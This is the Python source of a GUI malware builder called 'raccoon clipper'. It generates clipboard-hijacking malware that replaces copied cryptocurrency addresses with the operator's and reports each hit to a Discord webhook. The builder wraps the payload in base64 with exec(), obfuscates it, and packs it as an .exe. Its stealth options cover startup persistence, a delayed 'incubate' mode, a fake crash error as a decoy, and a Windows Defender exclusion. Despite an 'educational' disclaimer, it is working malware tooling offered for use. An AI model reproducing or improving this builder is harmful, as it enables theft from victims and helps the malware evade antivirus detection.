"""
enjoy my spaghetti code

written with love by me >> https://github.com/3022-2
""" 

import tkinter.messagebox as messagebox
from PIL import Image

import customtkinter
import subprocess
import webbrowser
import CTkToolTip
import threading
import requests
import shutil
import base64
import time
import hPyT
import sys
import re
import os

btc_address_pattern = r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"
eth_address_pattern = r"^(0x)?[0-9a-fA-F]{40}$"
xmr_address_pattern = r"^4[0-9AB][0-9a-zA-Z]{93}$"
ltc_address_pattern = r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"
sol_address_pattern = r"^(?:[a-zA-Z0-9]){44}$"
doge_address_pattern = r"^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$"
xrp_address_pattern = r"r[0-9a-zA-Z]{24,34}$"
trx_address_pattern = r"^T[a-zA-Z0-9]{33}$"
bch_address_pattern = r"^(bitcoincash:)?(q|p)[a-z0-9]{41}$"

customtkinter.set_appearance_mode("dark")

cwd = os.getcwd()

class attempt_fix_icons:
    def command():
        os.system("taskkill /f /im explorer.exe")
        os.startfile("explorer.exe")

    def thread():
        thread = threading.Thread(target=attempt_fix_icons.command())
        thread.start()

class toplevel:
    def agree():
        if agree_var.get() == "off":
            close_btn.configure(state="disabled")
            close_btn.update()
        elif agree_var.get() == "on":
            close_btn.configure(state="normal")
            close_btn.update()

    def close():
        hPyT.opacity.set(root, 0.999)
        hPyT.minimize_button.enable(root)
        top_level.destroy()
        root.unbind("<Configure>")
        val = dont_show_again_checkbox.get()
        root.attributes('-topmost', False)
        if val == "on":
            with open("dont_show_again.txt", "w") as file:
                file.close()

    def top():
        global top_level, dont_show_again_checkbox, agree_var, close_btn

        top_level = customtkinter.CTkToplevel()
        top_level.geometry("600x335")
        top_level.resizable(height=False, width=False)
        root.attributes('-topmost', True)
        top_level.attributes('-topmost', True)
        hPyT.title_bar.hide(top_level)
        hPyT.minimize_button.disable(root)
        hPyT.maximize_button.disable(root)
        hPyT.opacity.set(root, 0.8)
        hPyT.window_frame.center_relative(root, top_level)

        root.bind("<Configure>", lambda event: hPyT.window_frame.center_relative(root, top_level))

        text_frame = customtkinter.CTkScrollableFrame(master=top_level)
        text_frame.pack(fill="both", padx=10, pady=(18, 10))

        customtkinter.CTkLabel(master=text_frame, text="written by https://github.com/3022-2", font=("", 15, "bold")).pack()
        customtkinter.CTkLabel(master=text_frame, text="").pack()
        customtkinter.CTkLabel(master=text_frame, text="DISCLAIMER: This program is intended for educational and malware analysis purposes only. Any use of this code for illegal or unethical activities is strictly prohibited. The author of this code shall not be held responsible for any misuse or damage resulting from its use. Users are solely responsible for ensuring compliance with applicable laws and ethical standards. By pressing I agree and continuing to use this program you agree that the author of this code shall not be held responsible for any misuse or damage resulting from its use.", wraplength=500, font=("", 15, "bold")).pack()
        customtkinter.CTkLabel(master=text_frame, text="").pack()
        customtkinter.CTkLabel(master=text_frame, text="WARNING: THIS IS A PROGRAM DESIGNED TO BUILD MALWARE. THE MALWARE IS FOR STEALING CRYPTOCURRENCY. USE UNINSTALL GUIDE IF uninstaller.py FAILS. (not found error doesn't necessarily mean didnt uninstall)", wraplength=500, font=("", 15, "bold")).pack()
        customtkinter.CTkLabel(master=text_frame, text="").pack()
        customtkinter.CTkLabel(master=text_frame, text="dont forget the follow the LICENSE if you wish to distribute copies of this program", wraplength=500, font=("", 15, "bold")).pack()
        
        agree_var = customtkinter.StringVar(value="off")

        i_agree = customtkinter.CTkCheckBox(master=top_level, text="I agree", onvalue="on", offvalue="off", variable=agree_var, command=lambda: toplevel.agree())
        i_agree.pack(anchor="w", padx=(237, 0), pady=(0, 5))
        dont_show_again_checkbox = customtkinter.CTkCheckBox(master=top_level, text="dont show this again", onvalue="on", offvalue="off")
        dont_show_again_checkbox.pack(anchor="w", padx=(237, 0))

        close_btn = customtkinter.CTkButton(master=top_level, text="close window", command=lambda: toplevel.close(), state="disabled", width=500)
        close_btn.pack(pady=5)

        exit = customtkinter.CTkButton(master=top_level, text="EXIT", fg_color="red", hover_color="#8B0000", font=("", 13, "bold"), width=500, command=lambda: sys.exit())
        exit.pack()

class resetconfig:
    def reset():
        root.destroy()
        root.quit()
        buildgui.main()

class build:
    def exe(current_path, new_file_name):
        if icon_path == "":
            start = time.time()
            subprocess.run(["pyinstaller", "--onefile", "--icon", "DefultIcons/exe.ico", current_path, "--distpath", "output/dist_non_obfuscated"])
            end = time.time()
            final_time = round(end - start)
        else:
            start = time.time()
            subprocess.run(["pyinstaller", "-w", "--onefile", "--icon", icon_path, current_path, "--distpath", "output/dist_non_obfuscated"])
            end = time.time()
            final_time = round(end - start)

        if os.path.exists("output\\dist_non_obfuscated"):
            shutil.rmtree("build")
            rm_file_path = str(new_file_name).replace(".pyw", ".spec")
            os.remove(rm_file_path)
            messagebox.showinfo(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_non_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")

    def obfuscate(current_path, new_file_name):
        if icon_path == "":
            start = time.time()
            subprocess.run(["pyarmor", "-d","cfg", "pack:pyi_options", "=", f'" -w --icon DefultIcons/exe.ico"'])
            time.sleep(1)
            subprocess.run(["pyarmor", "gen", f"{current_path}", "--output=output/dist_obfuscated", "--pack=onefile"])
            end = time.time()
            final_time = round(end - start)
        else:
            start = time.time()
            subprocess.run(["pyarmor", "-d","cfg", "pack:pyi_options", "=", f'" -w --icon {icon_path}"'])
            time.sleep(1)
            subprocess.run(["pyarmor", "gen", f"{current_path}", "--output=output/dist_obfuscated", "--pack", "onefile"])
            end = time.time()
            final_time = round(end - start)

        if os.path.exists("output\\dist_obfuscated"):
            shutil.rmtree(".pyarmor")
            shutil.rmtree("dist")
            rm_file_path = str(new_file_name).replace(".pyw", ".spec")
            os.remove(rm_file_path)
            messagebox.showinfo(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")
    
    def build_method(single_use, obfuscate, exe_file, methodtype):
        btc_addr = btc_addr1
        eth_addr = eth_addr1
        ltc_addr = ltc_addr1
        xmr_addr = xmr_addr1
        bch_addr = bch_addr1
        sol_addr = sol_addr1
        doge_addr = doge_addr1  
        xrp_addr = xrp_addr1
        trx_addr = trx_addr1

        if btc_addr == "":
            btc_addr = "SET BTC ADDRESS HERE"
        if eth_addr == "":
            eth_addr = "SET ETH ADDRESS HERE"
        if ltc_addr == "":
            ltc_addr = "SET LTC ADDRESS HERE"
        if xmr_addr == "":
            xmr_addr = "SET XMR ADDRESS HERE"
        if bch_addr == "":
            bch_addr = "SET BCH ADDRESS HERE"
        if sol_addr == "":
            sol_addr = "SET SOL ADDRESS HERE"
        if doge_addr == "":
            doge_addr = "SET DOGE ADDRESS HERE"
        if xrp_addr == "":
            xrp_addr = "SET XRP ADDRESS HERE"
        if trx_addr == "":
            trx_addr = "SET TRX ADDRESS HERE"
        
        if methodtype == "subprocess":
            with open("scripts\\subprocess_method.pyw", "r") as file:
                script_content = file.read()
        if methodtype == "ctypes":
            with open("scripts\\ctypes_method.pyw", "r") as file:
                script_content = file.read()
        if methodtype == "pyperclip":
            with open("scripts\\pyperclip_method.pyw", "r") as file:
                script_content = file.read()
        if methodtype == "tkinter":
            with open("scripts\\tkinter_method.pyw", "r") as file:
                script_content = file.read()
        if methodtype == "win32clipboard":
            with open("scripts\\win32clipboard_method.pyw", "r") as file:
                script_content = file.read()
        if methodtype == "clipboard":
            with open("scripts\\clipboard_method.pyw", "r") as file:
                script_content = file.read()

        with open("scripts\\temp.pyw", "w") as file:
            file.write(script_content)
            file.close()
            
        with open("scripts\\temp.pyw", "r") as file:
            script_content = file.read()

        if single_use_checkbox.get() == "on":
            single_use = True
        else:
            single_use = False
        if ping_discord_checkbox.get() == "on":
            ping = True
        else:
            ping = False
        if incubate_checkbox.get() == "on":
            incubate = True
        else:
            incubate = False
        if false_error_checkbox.get() == "on":
            false_error = True
        else:
            false_error = False
        if exclude_av_checkbox.get() == "on":
            exclude_av = True
        else:
            exclude_av = False

        script_content = script_content.replace('btcaddr = "SET BTC ADDRESS HERE"', f"btcaddr = '{btc_addr}'")
        script_content = script_content.replace('ethaddr = "SET ETH ADDRESS HERE"', f"ethaddr = '{eth_addr}'")
        script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
        script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
        script_content = script_content.replace('bchaddr = "SET BCH ADDRESS HERE"', f"bchaddr = '{bch_addr}'")
        script_content = script_content.replace('soladdr = "SET SOL ADDRESS HERE"', f"soladdr = '{sol_addr}'")
        script_content = script_content.replace('dogeaddr = "SET DOGE ADDRESS HERE"', f"dogeaddr = '{doge_addr}'")
        script_content = script_content.replace('xrpaddr = "SET XRP ADDRESS HERE"', f"xrpaddr = '{xrp_addr}'")
        script_content = script_content.replace('trxaddr = "SET TRX ADDRESS HERE"', f"trxaddr = '{trx_addr}'")

        script_content = script_content.replace('single_use = False', f'single_use = {single_use}')
        script_content = script_content.replace('webhook_url = ""', f'webhook_url = "{webhook_url1}"')
        script_content = script_content.replace('ping = False', f'ping = {ping}')
        script_content = script_content.replace('incubate = False', f'incubate = {incubate}')
        script_content = script_content.replace('false_error = False', f'false_error = {false_error}')
        script_content = script_content.replace('exclude_av = False', f'exclude_av = {exclude_av}')

        temp_ignore_lst = []

        with open("ignore.txt", "r") as file:
            ignore = file.read().strip()
            for line in ignore.split("\n"):
                temp_ignore_lst.append(line)

        script_content = script_content.replace('ignore = []', f'ignore = {temp_ignore_lst}')

        if methodtype == "subprocess":
            if out_name.get().strip() == "":
                new_file_name = "subprocess_clipper.pyw"

                with open(os.path.join("output", new_file_name), "w") as new_file:
                    new_file.write(script_content)
        elif methodtype == "ctypes":
            if out_name.get().strip() == "":
                new_file_name = "ctypes_clipper.pyw"

                with open(os.path.join("output", new_file_name), "w") as new_file:
                    new_file.write(script_content)
        elif methodtype == "pyperclip":
            if out_name.get().strip() == "":
                new_file_name = "pyperclip_clipper.pyw"

                with open(os.path.join("output", new_file_name), "w") as new_file:
                    new_file.write(script_content)
        elif methodtype == "tkinter":
            if out_name.get().strip() == "":
                new_file_name = "tkinter_clipper.pyw"

                with open(os.path.join("output", new_file_name), "w") as new_file:
                    new_file.write(script_content)
        elif methodtype == "win32clipboard":
            if out_name.get().strip() == "":
                new_file_name = "win32clipboard_clipper.pyw"

                with open(os.path.join("output", new_file_name), "w") as new_file:
                    new_file.write(script_content)
        elif methodtype == "clipboard":
            if out_name.get().strip() == "":
                new_file_name = "clipboard_clipper.pyw"

                with open(os.path.join("output", new_file_name), "w") as new_file:
                    new_file.write(script_content)
        else:
            if ".pyw" not in out_name.get().strip():
                check_valid_btn.configure(text="build", command=lambda: build.check_type(), state="normal")
                messagebox.showerror(title="error", message="file must end in .pyw (python windowless)")
            else:
                new_file_name = out_name.get().strip().replace(" ", "")
                with open(os.path.join("output", new_file_name), "w") as new_file:
                    new_file.write(script_content)

        if encrypt_base64_checkbox.get() == "on":
            def get_imports(script_content):
                lines = script_content.split('\n')
                import_lines = [line for line in lines if line.startswith('import ')]
                return '\n'.join(import_lines)
            def remove_imports(script_content):
                lines = script_content.split('\n')
                filtered_lines = [line for line in lines if not line.startswith('import ')]
                return '\n'.join(filtered_lines)

            with open(os.path.join("output", new_file_name), "r") as file:
                script_content = file.read()
                import_lines = get_imports(script_content)
                script_content_without_imports = remove_imports(script_content)
                
            with open(os.path.join("output", new_file_name), "w") as file:
                encoded_content = base64.b64encode(script_content_without_imports.encode()).decode()
                file.write(f"#uses base64 - to decrypt search base64 decoder\n\n{import_lines}\n\nexec(base64.b64decode('{encoded_content}').decode())")

        if obfuscate == "on":
            current_path = os.path.join("output", new_file_name)
            build.obfuscate(current_path, new_file_name)
        if exe_file == "on":
            current_path = os.path.join("output", new_file_name)
            build.exe(current_path, new_file_name)

        os.remove("scripts/temp.pyw")

    def check_type():
        check_valid_btn.configure(text="to run again set a new config with reset config", state="disabled")
        time.sleep(1)

        if type == "subprocess (0 external modules - alright but slow on old/bad/slow hardware)":
            methodtype = "subprocess"
            build.build_method(single_use, obfuscate, exe_file, methodtype)
        if type == "ctypes (0 external modules - can be buggy)":
            methodtype = "ctypes"
            build.build_method(single_use, obfuscate, exe_file, methodtype)
        if type == "pyperclip (1 external module - fast but worst as requires target to install pyperclip)":
            methodtype = "pyperclip"
            build.build_method(single_use, obfuscate, exe_file, methodtype)
        if type == "tkinter (0 external modules - best - works on old/bad/slow hardware)": 
            methodtype = "tkinter"
            build.build_method(single_use, obfuscate, exe_file, methodtype)
        if type == "win32clipboard (1 external module - fast but worst as requires target to install pywin32)":
            methodtype = "win32clipboard"
            build.build_method(single_use, obfuscate, exe_file, methodtype)
        if type == "clipboard (1 external module - fast but worst as requires target to install clipboard)":
            methodtype = "clipboard"
            build.build_method(single_use, obfuscate, exe_file, methodtype)
            
class buildclipperconfig:
    class_called = 0

    def set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, bch_addr,
                   btc_addr, eth_addr, xmr_addr, 
                   ltc_addr, sol_addr, doge_addr,
                   xrp_addr, trx_addr, webhook_url):
        global type, single_use, obfuscate, exe_file, ping

        type = str(clipper_type.get())

        single_use = single_use_checkbox.get()
        obfuscate = obfuscate_checkbox.get()
        exe_file = exe_file_checkbox.get()
        ping = ping_discord_checkbox.get()

        if obfuscate == "on" and exe_file == "on":
            messagebox.showerror(title="error", message="both normal .exe and obfuscate .exe cannot be on")
        elif obfuscate == "off" and exe_file == "off":
            messagebox.showerror(title="error", message="please pick a filetype (.exe, .exe obfuscated)")
        else:
            if type == "set clipper type":
                messagebox.showerror(title="error", message="please pick a valid clipper type")
                buildclipperconfig.class_called = 0
            else:
                buildclipperconfig.class_called += 1
                config_set_lbl.configure(text="config set", text_color="green")
                set_config_btn.configure(text="reset config", fg_color="red", hover_color="#8B0000", command=lambda: resetconfig.reset())
class buildgui:
    def check_addr_valid(btc_addr, eth_addr, xmr_addr,
                         ltc_addr, bch_addr, sol_addr, doge_addr,
                         xrp_addr, trx_addr, webhook_url):
        if buildclipperconfig.class_called == 0:
            messagebox.showerror(title="error", message="please set a config")

        else:
            global btc_addr1, eth_addr1, xmr_addr1, ltc_addr1, bch_addr1, sol_addr1, doge_addr1, xrp_addr1, trx_addr1, webhook_url1

            btc_addr1 = str(btc_addr.get()).strip()
            eth_addr1 = str(eth_addr.get()).strip()
            xmr_addr1 = str(xmr_addr.get()).strip()
            ltc_addr1 = str(ltc_addr.get()).strip()
            bch_addr1 = str(bch_addr.get()).strip()
            sol_addr1 = str(sol_addr.get()).strip()
            doge_addr1 = str(doge_addr.get()).strip()
            xrp_addr1 = str(xrp_addr.get()).strip()
            trx_addr1 = str(trx_addr.get()).strip()

            webhook_url1 = str(webhook_url.get()).strip()

            if btc_addr1 == "" and eth_addr1 == "" and xmr_addr1 == "" and ltc_addr1 == "" and bch_addr1 == "" and sol_addr1 == "" and doge_addr1 == "" and xrp_addr1 == "" and trx_addr1 == "" and webhook_url1 == "":
                messagebox.showinfo(title="info", message="please add at least one crypto address")
            else:
                try:
                    if btc_addr1 != "":
                        if re.match(btc_address_pattern, btc_addr1):
                            btc_addr.configure(border_color="green")
                        else:
                            btc_addr.configure(border_color="red")
                    if eth_addr1 != "":
                        if re.match(eth_address_pattern, eth_addr1):
                            eth_addr.configure(border_color="green")
                        else:
                            eth_addr.configure(border_color="red")
                    if xmr_addr1 != "":
                        if re.match(xmr_address_pattern, xmr_addr1):
                            xmr_addr.configure(border_color="green")
                        else:
                            xmr_addr.configure(border_color="red")
                    if ltc_addr1 != "":
                        if re.match(ltc_address_pattern, ltc_addr1):
                            ltc_addr.configure(border_color="green")
                        else:
                            ltc_addr.configure(border_color="red")
                    if bch_addr1 != "":
                        if re.match(bch_address_pattern, bch_addr1):
                            bch_addr.configure(border_color="green")
                        else:
                            bch_addr.configure(border_color="red")
                    if sol_addr1 != "":
                        if re.match(sol_address_pattern, sol_addr1):
                            sol_addr.configure(border_color="green")
                        else:
                            sol_addr.configure(border_color="red")
                    if doge_addr1 != "":
                        if re.match(doge_address_pattern, doge_addr1):
                            doge_addr.configure(border_color="green")
                        else:
                            doge_addr.configure(border_color="red")
                    if xrp_addr1 != "":
                        if re.match(xrp_address_pattern, xrp_addr1):
                            xrp_addr.configure(border_color="green")
                        else:
                            xrp_addr.configure(border_color="red")
                    if trx_addr1 != "":
                        if re.match(trx_address_pattern, trx_addr1):
                            trx_addr.configure(border_color="green")
                        else:
                            trx_addr.configure(border_color="red")

                    if webhook_url1 != "":
                        r = requests.get(webhook_url1)
                        if r.status_code == 200:
                            webhook_url.configure(border_color="green")
                            try:
                                r = requests.post(webhook_url1, json={"content": "```WEBHOOK CONNECTED```"})
                            except Exception as e:
                                messagebox.showerror(title="error", message=e)

                        else:
                            webhook_url.configure(border_color="red")
                    
                    check_valid_btn.configure(text="build", command=lambda: build.check_type())

                except Exception as e:
                    messagebox.showerror(title="error", message=e)

    def icon_add():
        global icon_path

        icon_path = customtkinter.filedialog.askopenfilename(initialdir=f"{cwd}\\DefultIcons", title="select icon", filetypes=[("Icon Files", "*.ico")])

        if icon_path == "":
            pass
        else:
            icon_img = customtkinter.CTkImage(light_image=Image.open(icon_path),
                                              dark_image=Image.open(icon_path),
                                              size=(70, 70))
            
            icon_temp_label.configure(image=icon_img, text="")
            
    def build_widgets():
        global check_valid_btn, config_set_lbl, set_config_btn, clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, out_name, icon_temp_label, add_icon_btn, icon_path, ping_discord_checkbox

        icon_path = ""

        for widget in option_frame.winfo_children():
            widget.destroy()
        for widget in option_frame.winfo_children():
            widget.destroy()

        customtkinter.CTkLabel(master=option_frame, text="clipper settings").pack(padx=65)
        customtkinter.CTkLabel(master=main_frame, text="if address or webhook format isnt correct border will stay same rather than turn green if correct").pack()

        addr_entry_frame = customtkinter.CTkScrollableFrame(master=main_frame)
        addr_entry_frame.pack(fill="x", padx=5)

        btc_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="BTC address (leave empty if none): ")
        btc_addr.pack(fill="x", padx=5, pady=5)
        eth_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="ETH address (leave empty if none): ")
        eth_addr.pack(fill="x", padx=5, pady=0)
        ltc_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="LTC address (leave empty if none): ")
        ltc_addr.pack(fill="x", padx=5, pady=5)
        xmr_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="XMR address (leave empty if none): ")
        xmr_addr.pack(fill="x", padx=5, pady=0)
        bch_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="BCH address (leave empty if none): ")
        bch_addr.pack(fill="x", padx=5, pady=5)
        sol_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="SOL address (leave empty if none): ")
        sol_addr.pack(fill="x", padx=5, pady=0)
        doge_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="DOGE address (leave empty if none): ")
        doge_addr.pack(fill="x", padx=5, pady=5)
        xrp_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="XRP address (leave empty if none): ")
        xrp_addr.pack(fill="x", padx=5, pady=0)
        trx_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="TRX address (leave empty if none): ")
        trx_addr.pack(fill="x", padx=5, pady=5)

        webhook_url = customtkinter.CTkEntry(master=main_frame, placeholder_text="discord webhook (leave empty if none): ")
        webhook_url.pack(fill="x", padx=5, pady=5)
        out_name = customtkinter.CTkEntry(master=main_frame, placeholder_text="output file name WITH .pyw extention (leave empty if for defult name. spaces will be removed)")
        out_name.pack(fill="x", padx=5, pady=0)

        check_valid_btn = customtkinter.CTkButton(master=main_frame, text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, 
                                                                                                                                                   ltc_addr, bch_addr, sol_addr, doge_addr,
                                                                                                                                                   xrp_addr, trx_addr, webhook_url), state="normal")
        check_valid_btn.pack(fill="x", padx=5, pady=5)
        fix_icons = customtkinter.CTkButton(master=main_frame, text="fix icons if not showing on .exe", command=lambda: attempt_fix_icons.thread())
        fix_icons.pack(fill="x", padx=5, pady=0)
        exit = customtkinter.CTkButton(master=main_frame, text="EXIT", fg_color="red", hover_color="#8B0000", font=("", 13, "bold"), command=lambda: sys.exit())
        exit.pack(fill="x", padx=5, pady=5)
        
        clipper_type = customtkinter.CTkComboBox(master=option_frame, state="readonly", 
                                                 values=["set clipper type",
                                                         "tkinter (0 external modules - best - works on old/bad/slow hardware)",
                                                         "subprocess (0 external modules - alright but slow on old/bad/slow hardware)", 
                                                         "ctypes (0 external modules - can be buggy)",
                                                         "win32clipboard (1 external module - fast but worst as requires target to install pywin32)",
                                                         "pyperclip (1 external module - fast but worst as requires target to install pyperclip)",
                                                         "clipboard (1 external module - fast but worst as requires target to install clipboard)"])
        
        clipper_type.set("set clipper type")
        clipper_type.pack(fill="x", padx=10, pady=5)

        config_scroll_frame = customtkinter.CTkScrollableFrame(master=option_frame)
        config_scroll_frame.pack(expand=True, fill="y", padx=5, pady=5)

        add_icon_btn = customtkinter.CTkButton(master=config_scroll_frame, text="add custom icon", command=lambda: buildgui.icon_add())
        add_icon_btn.pack(fill="x", padx=5, pady=0)

        icon_temp_label = customtkinter.CTkLabel(master=config_scroll_frame, text="icon will appear here", wraplength=150)
        icon_temp_label.pack(pady=(0, 5))

        set_config_btn = customtkinter.CTkButton(master=config_scroll_frame, fg_color="green", hover_color="#063b00", text="set config", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, 
                                                                                                                                                                                btc_addr, eth_addr, xmr_addr, bch_addr,
                                                                                                                                                                                ltc_addr, sol_addr, doge_addr,
                                                                                                                                                                                xrp_addr, trx_addr, webhook_url))
        set_config_btn.pack(fill="x", padx=10, pady=0)
        config_set_lbl = customtkinter.CTkLabel(master=config_scroll_frame, text="config not set", text_color="red")
        config_set_lbl.pack()
        single_use_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="single use", onvalue="on", offvalue="off")
        single_use_checkbox.pack(pady=0, anchor="w", padx=(0, 0))
        ping_discord_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="@everyone discord", onvalue="on", offvalue="off")
        ping_discord_checkbox.pack(pady=5, anchor="w", padx=(0, 0))
        obfuscate_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="obfuscated .exe", onvalue="on", offvalue="off")
        obfuscate_checkbox.pack(pady=0, anchor="w", padx=(0, 0))
        exe_file_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="normal .exe file", onvalue="on", offvalue="off")
        exe_file_checkbox.pack(pady=5, anchor="w", padx=(0, 0))

        """going to just use global here on"""
        global incubate_checkbox, false_error_checkbox, encrypt_base64_checkbox, exclude_av_checkbox
        incubate_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="incubate (4 restarts)", onvalue="on", offvalue="off")
        incubate_checkbox.pack(pady=0, anchor="w", padx=(0, 0))
        false_error_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="false error", onvalue="on", offvalue="off")
        false_error_checkbox.pack(pady=5, anchor="w", padx=(0, 0))
        encrypt_base64_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="encrypt base64", onvalue="on", offvalue="off")
        encrypt_base64_checkbox.pack(pady=0, anchor="w", padx=(0, 0))
        exclude_av_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="exclude windows av", onvalue="on", offvalue="off")
        exclude_av_checkbox.pack(pady=5, anchor="w", padx=(0, 0))

        CTkToolTip.CTkToolTip(widget=single_use_checkbox, message="single use: code will run at startup until it detects a address to replace, when this happens the code will never run again - essentially only ever clipping once", wraplength=300)
        CTkToolTip.CTkToolTip(widget=obfuscate_checkbox, message="obfuscate: will run obfucscation and make .exe to make it more difficult to read and more difficult for anti virus detections", wraplength=300)
        CTkToolTip.CTkToolTip(widget=exe_file_checkbox, message=".exe file: will turn the python code into a .exe file without obfuscating", wraplength=300)
        CTkToolTip.CTkToolTip(widget=clipper_type, message="set clipper type: all methods read and regex the clipboard for crypto addresses, then replace the address with your chosen one.", wraplength=300)
        CTkToolTip.CTkToolTip(widget=fix_icons, message="update icons: pressing this restarts explorer.exe making all icons update, this will close all folders open", wraplength=300)
        CTkToolTip.CTkToolTip(widget=ping_discord_checkbox, message="ping discord: if enabled and discord webhook added an @everyone ping will be sent to the webhook", wraplength=300)
        CTkToolTip.CTkToolTip(widget=set_config_btn, message="set config: sets the configuration you chose", wraplength=300)
        CTkToolTip.CTkToolTip(widget=add_icon_btn, message="add icon: sets a custom icon to the .exe - defult is the normal .exe icon. if icons not showing press the fix icons button", wraplength=300)
        CTkToolTip.CTkToolTip(widget=exit, message="exit: exits program", wraplength=300)
        CTkToolTip.CTkToolTip(widget=check_valid_btn, message="check valid: checks validity of crypto addresses and discord webhook", wraplength=300)
        CTkToolTip.CTkToolTip(widget=incubate_checkbox, message="incubate: if enabled the code will not run until the computer is restarted 4 times, increases stealth, IF INCUBATE IS ENABLED FALSE ERROR WILL NEVER COME UP", wraplength=300)
        CTkToolTip.CTkToolTip(widget=false_error_checkbox, message="false error: if enabled the code will throw a false error to make it look like the code has crashed when it really is just a decoy (wont be installed in the peristant file). IF INCUBATE IS ENABLED FALSE ERROR WILL NEVER COME UP", wraplength=300)
        CTkToolTip.CTkToolTip(widget=encrypt_base64_checkbox, message="encrypt base64: if enabled the malware src code will be encrypted with base64 and executed with exec(). This works with both normal exe or obfuscated exe", wraplength=300)
        CTkToolTip.CTkToolTip(widget=exclude_av_checkbox, message="exclude windows av: if enabled the code will attempt to exclude %appdata% path from windows defender antivirus. THIS REQUIRES THE EXE TO BE RUN AS ADMIN. Even if antivirus picks up on the malware at run it can still set the exclusion and make the persistent file (meaning even if the antivirus detects when ran the startup file will still run as its been set within an exclude folder)", wraplength=300)

    def main():
        global option_frame, main_frame, root

        root = customtkinter.CTk()
        root.title("raccoon clipper - crypto malware builder")
        root.minsize(width=800, height=400)
        root.geometry("600x475")
        root.resizable(height=False, width=False)
        root.iconbitmap("DefultIcons/racoon.ico")

        hPyT.rainbow_border.start(window=root, interval=5)

        tabview = customtkinter.CTkTabview(master=root)
        tabview.pack(fill="both", expand=True, padx=5, pady=5)
        tabview.add("builder")
        tabview.add("documentation")
        tabview._segmented_button.grid(sticky="w", padx=10)

        option_frame = customtkinter.CTkFrame(master=tabview.tab("builder"), fg_color="#242424")
        option_frame.pack(side="left", fill="y")
        main_frame = customtkinter.CTkFrame(master=tabview.tab("builder"), fg_color="#242424")
        main_frame.pack(fill="both", expand=True, side="right", anchor="n", padx=(0, 0))

        docs = customtkinter.CTkScrollableFrame(master=tabview.tab("documentation"), fg_color="#242424")
        docs.pack(fill="both", expand=True)
        customtkinter.CTkLabel(master=docs, text="""What does this program do?
This program is a GUI based malware builder. It allows a user to make a customised piece crypto clipper malware.

What systems can this malware and builder work on?
The malware and builder will only run on windows computers. It will not run on mac or linux. It will not run  on computers without python installed.

What kind of malware?
The kind of malware is known as crypto clipper malware. This malware will replace any crypto address in the clipboard with the one you set in the config.

Features:
    -supports bitcoin, bitcoin cash, ethereum, litecoin, monero, solana, dogecoin, ripple, tron.
    -has single use method meaning after one log the code wont run again.
    -duplicates itself to run at startup with a different name.
    -can a add custom icon as .ico file.
    -has an option to obfuscate the .exe but this isnt needed.
    -runs as .pyw file (python windowless) so it runs as background task.
    -if discord webhook added it sends a ping to discord webhook when crypto address detected.
    -has 6 different methods.
    -has a check validity button to check if the addresses are of valid regex.
    -has ignore list to ignore certain computer names (the malware will not run if on these computers).
    -creates a readble .pyw as well as the .exe so you can code inspect.
    -has ignore feature
    -has incubate feature
                               
How can i blacklist/ignore computers?
In the ignore.txt file you can add computer names to ignore. The malware will not run on these computers.

My icons arent showing on the .exe, why is this?
Honestly im not sure why this happens - you can press the fix icons button which will restart windows explorer to update icons - if this doesnt work create an issue on github and try delete IconCashe.db in %localappdata% and restarting computer.""", justify="left", wraplength=750).pack(anchor="w")
        customtkinter.CTkButton(master=tabview.tab("documentation"), text="https://github.com/3022-2", command=lambda: webbrowser.open_new_tab("https://github.com/3022-2")).pack(fill="x", pady=(0, 0))

        buildgui.build_widgets()
        if "dont_show_again.txt" not in os.listdir(cwd):
            toplevel.top()

        root.mainloop()

if __name__ == "__main__":
    if os.name == "nt":
        if os.path.exists("output\\dist_obfuscated"):
            pass
        else:
            os.mkdir("output\\dist_obfuscated")
        if os.path.exists("output\\dist_non_obfuscated"):
            pass
        else:
            os.mkdir("output\\dist_non_obfuscated")
        buildgui.main()
    else:
        messagebox.showerror(title="error", message="this program only works on windows")
